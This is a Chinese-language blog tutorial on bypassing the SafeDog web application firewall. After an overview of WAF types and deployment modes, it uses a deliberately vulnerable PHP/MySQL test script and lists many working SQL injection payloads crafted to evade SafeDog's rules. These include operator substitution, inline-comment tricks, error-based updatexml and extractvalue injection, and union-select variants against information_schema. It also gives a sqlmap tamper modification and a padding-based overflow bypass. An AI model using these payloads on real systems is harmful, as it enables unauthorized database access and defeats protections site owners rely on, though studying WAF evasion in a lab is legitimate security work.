# 绕waf系列之绕安全狗


<!--more-->
# 攻击的特定:

攻击二象性:已知攻击和未知攻击

# 目前市面主流的WAF产品:

## 云WAF

* 阿里云盾
* 腾讯网站管家
* 创宇盾
* ClodeFlare等

## 软件产品类

* 安全狗
* 云锁
* 360主机卫士
* ModSecurity

## 硬件类型设备:

* 启明星辰
* 绿盟
* 天融信
* 飞塔等

硬件waf缺陷:对HTTP协议的兼容性不强,对异常报文会产生bug,导致绕过

# WAF的核心原理:

* 运用黑白思想
* 特征匹配,漏洞签名:特定特征的漏洞,比如stract2漏洞
* 对匹配结果进行响应(拦截,记录)

# WAF的几种部署模式:

## 基于DNS解析

修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器
![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/1.png)

## 串联模式

一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署.
![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/2.png)

![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/3.png)

## 旁路模式

利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断.
![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/4.png)

## 软件嵌入中间件+检测引擎模式

在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务
![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/5.png)

# WAF为什么会被绕过:

1. 鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作
2. WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性
3. 硬件WAF自身往往存在漏洞
![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/6.png)

* 架构:waf部署模式
* 规则缺陷/特性
* 协议:指HTTP0.9协议:TCP长连接

# WAF绕过实战—-绕过安全狗进行注入

所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护

## 实验环境:

环境:安全狗Apache最新版
![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/7.png)

本地测试代码(PHP):

```php
$id = $_GET['id'];
$con = mysql_connect("localhost","root","root");
if (!$con){die('Could not connect: ' . mysql_error());}
mysql_select_db("dvwa", $con);
$query = "SELECT first_name,last_name FROM users WHERE user_id = '$id'; ";
$result = mysql_query($query)or die('<pre>'.mysql_error().'</pre>');
while($row = mysql_fetch_array($result))
{ 
echo $row['0'] . "&nbsp" . $row['1']; 
echo "<br />";}echo "<br/>";echo $query;
mysql_close($con);
```

## 绕过拦截and 1=1

首先先稍微测试一番,发现存在安全狗

```url
http://127.0.0.1/test.php?id=1  and 1=1%23
```

![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/8.png)

```TXT
and  1	拦截
and  '1'    拦截  
and  a	不拦截 
and  'a'    拦截  
and  !	不拦截 
and  1+1    拦截  
and  1+a    拦截  
and  hex(1)  不拦截
```

通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路

* 用其他字符替换 and 或者 or
* 带入的不是字符串和数字型，带入一个特殊符号
* 

针对第一种我们可以去看看运算符号 随便找到几个| ^ xor & / * && || 等等还有很多

```TXT
与运算 a & b  , 
或运算 a | b ,  
异或运算 a ^ b
```

那么可以试着将and替换成&&,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过

```url
http://127.0.0.1/test.php?id=1' %26%26 true%23
```

![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/9.png)

另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&& || ,oracle不支持 && ||）

```TXT
http://127.0.0.1/test.php?id=1'  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
http://127.0.0.1/test.php?id=1'   ||(1) %23 		//使用括号代替空格绕过
//异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）
http://127.0.0.1/test.php?id=1'  xor 1%23			
http://127.0.0.1/test.php?id=1'  xor true%23
```

## 绕过order by查询

判断查询字段,使用mysql的<code>\/\*\!\*\/</code>内敛注释去绕过防护,而其中的代码是可以正常执行的

```url
http://127.0.0.1/test.php?id=1' /*!order*//*!by*/2%23
```

![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/10.png)

## 绕过union select查询

使用union xxx页面正常
![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/11.png)

但是用union和select放在在一起就被发现啦
![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/12.png)

在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过

```url
http://127.0.0.1/test.php?id=1'=/*!user () regexp 0x5e72*/--+
```

![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/13.png)

* 对于数字型注入,可以将其转换成浮点型
* 联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过,
* 函数中可以插入任何混淆字符绕过waf
* 另外使用-1可以省去空格绕过waf

```url
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
```

![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/14.png)

基于报错信息的注入绕安全狗

```url
http://127.0.0.1/test.php?id=1' and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
http://127.0.0.1/test.php?id=1' and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23
```

## 绕过select from

使用大括号去绕过

```url
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
```

![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/15.png)

使用反引号去绕过

```url
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`
```

使用\N去绕过

```url
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
```

括号法去绕过

```url
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
```

也可以组合起来

```url
http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
```

这些都是去掉空格的合法语句,当然如果不拦截<code>\/\*\/或\/\!\*\/</code>的话,也可以尝试这两个

> 提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。

补充点
php+mysql环境下支持的空格有：

```TXT
%0a,%0b,%0c,%0d,%20,%09,%a0,/**/
```

其中使用的最多的就是<code>%0a,%0b,%a0,\/\*\*\/</code>，这四个当作空格插入在语句中来扰乱waf检测。
干货分享：使用<code>/^!$asd%2a–=/</code>代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的<code>\/\*\/换成\/^!$asd%2a–=\*\/</code>即可使用sqlmap跑了。

## 缓冲区溢出绕waf

另外也可以对安全狗实行缓冲区溢出绕waf
缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过
要求是(针对于安全狗而已):
GET类型请求转换成POST类型
Content-Length头长度大于4008
正常参数放置在脏数据后面

![](https://cdn.jsdelivr.net/gh/CNbysec/CNbysec.github.io/OSS/img/绕waf系列之绕安全狗/16.png)


